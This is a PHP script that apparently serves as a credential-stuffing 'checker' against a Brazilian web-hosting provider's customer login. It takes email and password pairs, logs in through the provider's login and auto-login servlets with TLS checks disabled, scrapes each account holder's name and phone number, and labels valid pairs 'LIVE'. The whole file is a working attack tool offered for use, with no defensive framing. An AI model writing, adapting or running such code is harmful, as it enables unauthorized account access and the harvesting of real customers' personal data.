
<?php
set_time_limit(0);
error_reporting(0);


class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url, $vars) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOBODY, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 200);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        }
        $data = curl_exec($ch);
       // echo $data;
        curl_close($ch);

        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url, $vars) {
        return $this->doRequest('POST', $url, $vars);
    }
}

function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$linha = $_GET["linha"];
$email = explode("|", $linha)[0];
$senha = explode("|", $linha)[1];

/* switch ($ano) {
    case '2017':
        $ano = '17';
        break;
    case '2018':
        $ano = '18';
        break;
    
    case '2019':
        $ano = '19';
        break;
        case '2020':
        $ano = '20';
        break;
        case '2021':
        $ano = '21';
        break;
        case '2022':
        $ano = '22';
        break;
      
        case '2023':
        $ano = '23';
        break;
        case '2025':
        $ano = '25';
        break;
        case '2026':
        $ano = '26';
        break;
        
} */

$nc = new cURL();
$getoken = $nc->get('https://br.bluehost.com/login.php');
$token = getStr($getoken,'<input type="hidden" name="resellerid" value="','">');


$a = new cURL();
$b = $a->post('https://securelogin.org/login.php', 'action=secure_login&redirecturl=http%3A%2F%2Fbr.bluehost.com%2F&resellerid='.$token.'&txtUserName='.$email.'&txtPassword='.$senha.'&submit=Login+agora');
        

$nc2 = new cURL();
$getinfo = $nc2->get('https://br.bluehost.com/content.php?action=cp_login');


$redirect = getStr($getinfo,'self.location.href = \'','\';');



$nc3 = new cURL();
$getred = $nc3->get($redirect);


// PRIMEIRO GET DE IDS

$userid = getStr($getred,'<input type="hidden" name="userLoginId" value="','">');
$urlid = getStr($getred,'<input type="hidden" name="url" value="','">');



$a2 = new cURL();
$b2 = $a2->post('https://www.foundationapi.com/servlet/ProcessAutoLoginOnSSLServlet', 'userLoginId='.$userid.'&url='.$urlid.'&langpref=pt&role=customer');




// SEGUNDO GET DE IDS


$userid2 = getStr($b2,'<input type="hidden" name="userLoginId" value="','">');
$urlid2 = getStr($b2,'<input type="hidden" name="url" value="','">');



$a3 = new cURL();
$b3 = $a3->post('https://cp.br.bluehost.com/servlet/AuthenticationPassServlet', 'userLoginId='.$userid2.'&url='.$urlid2.'&langpref=pt&role=customer');




// GET DAS INFO DO PERFIL


$nc4 = new cURL();
$getinfo2 = $nc4->get('https://cp.br.bluehost.com/servlet/ModifyCustomerProfileServlet');



$nome = getStr($getinfo2,'<strong class="font-xlarge">','</strong><br/>');

$tel = getStr($getinfo2,'<span class="phone-sheading non-edit-mode">','</span>');



if($nome == ""){ $nome = "N/A"; }
if($tel == ""){ $tel = "N/A"; }



if (file_exists(getcwd().'/cookie.txt')) {
            unlink(getcwd().'/cookie.txt');
        }
               
        if (strpos($b, '<a href="index.php">If you are not automatically redirected please click here</a>')) { 







 echo "LIVE → $email|$senha | Nome: $nome | Telefone: $tel #FlashReverso";
 
  

        }else{

        echo "DIE → $email|$senha";
   

}
 
    


?>
